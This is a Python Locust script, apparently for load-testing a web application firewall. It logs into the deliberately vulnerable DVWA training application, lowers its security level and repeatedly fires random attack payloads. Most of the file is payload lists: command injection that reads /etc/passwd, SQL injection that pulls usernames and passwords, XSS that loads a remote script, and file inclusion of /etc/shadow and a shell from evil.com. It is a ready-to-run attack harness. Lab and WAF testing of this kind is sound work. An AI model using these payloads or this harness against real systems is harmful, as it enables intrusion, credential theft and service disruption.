
import os
import random
from locust import HttpUser, task, between
from bs4 import BeautifulSoup

# --- AGGRESSIVE PAYLOADS ---
# A wider and more obfuscated set of payloads for a more "massive" attack.
COMMAND_INJECTION_PAYLOADS = [
    '; whoami', '&& whoami', '| whoami', '`whoami`', '$(whoami)',
    '; ls -al /', '&& ls -al /', '| ls -al /',
    '; cat /etc/passwd', '&& cat /etc/passwd',
    '; netstat -an', '&& netstat -an',
    "127.0.0.1%0Acat%20/etc/passwd", # URL-encoded newline
    "|/usr/bin/id",
    "& ping -c 10 127.0.0.1 &", # Background command
]
SQL_INJECTION_PAYLOADS = [
    "1' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' UNION SELECT 1,2,3--",
    "1' UNION SELECT username, password FROM users--",
    "1' AND SLEEP(2)--", # Longer sleep
    """1' AND 1=0 UNION ALL SELECT table_name,
    table_schema FROM information_schema.tables --""",
    "1' OR 'a'='a'; --",
    "1' or 1=1 limit 1 --",
    "1' OR 1 IN (SELECT SLEEP(2))--",
]
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=\"javascript:alert('XSS');\">",
    "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
    "<IMG \"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", # HTML entities
    "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
    "<BODY ONLOAD=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
]
FILE_INCLUSION_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "../../../../../../../../windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php", # PHP filter
    "zip://../../../../../../../../var/log/auth.log#auth.log", # ZIP wrapper
    "http://evil.com/shell.txt",
    "/etc/shadow",
]


class DVWAUser(HttpUser):
    """
    Locust user class that simulates a user attacking the DVWA application.
    """
    # Wait time between tasks, can be adjusted. For high RPS, this should be low.
    wait_time = between(0.1, 0.5)
    
    def on_start(self):
        """
        Called when a virtual user starts. This will handle login and setting the security level.
        """
        self.username = os.environ.get("DVWA_USERNAME", "admin")
        self.password = os.environ.get("DVWA_PASSWORD", "password")
        self.security_level = "low"
        self.csrf_token_cache = {} # Cache for CSRF tokens

        print(f"[*] Virtual user starting. Attempting to log in as '{self.username}'...")
        
        # 1. Get login page to fetch initial CSRF token
        try:
            r = self.client.get("/login.php")
            if r is None or r.status_code != 200:
                print(f"[!] Failed to access login page. Status: {r.status_code if r else 'None'}")
                self.environment.runner.quit()
                return
            soup = BeautifulSoup(r.text, 'html.parser')
            user_token_elem = soup.find('input', {'name': 'user_token'})
            user_token = user_token_elem['value'] if user_token_elem else None
        except Exception as e:
            print(f"[!] Error accessing login page: {e}")
            user_token = None # Fallback if token not found

        # 2. Post login credentials
        login_data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": user_token
        }
        try:
            res = self.client.post("/login.php", data=login_data)
            if res is None or (hasattr(res, 'url') and res.url and "welcome.php" not in res.url and "index.php" not in res.url):
                print("[!] LOGIN FAILED. A virtual user could not log in. Stopping user.")
                self.environment.runner.quit()
                return
        except Exception as e:
            print(f"[!] Connection error during login: {e}")
            self.environment.runner.quit()
            return

        # 3. Set security level
        print(f"[*] Login successful. Setting security to '{self.security_level}'")
        security_url = "/security.php"
        
        # Get token from security page
        r = self.client.get(security_url)
        soup = BeautifulSoup(r.text, 'html.parser')
        try:
            security_token = soup.find('input', {'name': 'user_token'})['value']
        except Exception:
            print("[!] Could not find CSRF on security page. This might cause issues.")
            security_token = user_token # Fallback

        security_data = {
            "security": self.security_level,
            "seclev_submit": "Submit",
            "user_token": security_token
        }
        self.client.post(security_url, data=security_data)
        print("[+] Virtual user setup complete.")

    def _get_csrf_token(self, path):
        """Helper to get CSRF token for a specific page, with caching."""
        if path in self.csrf_token_cache:
            return self.csrf_token_cache[path]
        
        if self.security_level != "low":
            try:
                response = self.client.get(path)
                soup = BeautifulSoup(response.text, 'html.parser')
                token = soup.find('input', {'name': 'user_token'})['value']
                self.csrf_token_cache[path] = token
                return token
            except Exception:
                return None
        return None

    @task(1)
    def test_command_injection(self):
        try:
            payload = f"127.0.0.1{random.choice(COMMAND_INJECTION_PAYLOADS)}"
            self.client.post("/vulnerabilities/exec/", {"ip": payload, "Submit": "Submit"}, name="/vulnerabilities/exec/ [cmd]")
        except Exception as e:
            print(f"Error in command injection task: {e}")

    @task(1)
    def test_sql_injection(self):
        try:
            payload = random.choice(SQL_INJECTION_PAYLOADS)
            self.client.get(f"/vulnerabilities/sqli_blind/?id={payload}&Submit=Submit", name="/vulnerabilities/sqli_blind/ [sqli]")
        except Exception as e:
            print(f"Error in SQL injection task: {e}")

    @task(1)
    def test_reflected_xss(self):
        try:
            payload = random.choice(XSS_PAYLOADS)
            self.client.get(f"/vulnerabilities/xss_r/?name={payload}", name="/vulnerabilities/xss_r/ [xss]")
        except Exception as e:
            print(f"Error in reflected XSS task: {e}")

    @task(1)
    def test_file_inclusion(self):
        try:
            payload = random.choice(FILE_INCLUSION_PAYLOADS)
            self.client.get(f"/vulnerabilities/fi/?page={payload}", name="/vulnerabilities/fi/ [fi]")
        except Exception as e:
            print(f"Error in file inclusion task: {e}")

    @task(1)
    def test_stored_xss(self):
        try:
            path = "/vulnerabilities/xss_s/"
            token = self._get_csrf_token(path)
            payload = random.choice(XSS_PAYLOADS)
            
            post_data = {
                "txtName": "locust_user",
                "mtxMessage": payload,
                "btnSign": "Sign Guestbook",
            }
            if token:
                post_data["user_token"] = token
                
            self.client.post(path, data=post_data, name="/vulnerabilities/xss_s/ [stored_xss]")
        except Exception as e:
            print(f"Error in stored XSS task: {e}")

if __name__ == "__main__":
    print("This script is intended to be run with Locust.")
    print("Example: locust -f waf_load_test.py --host http://192.168.18.177")
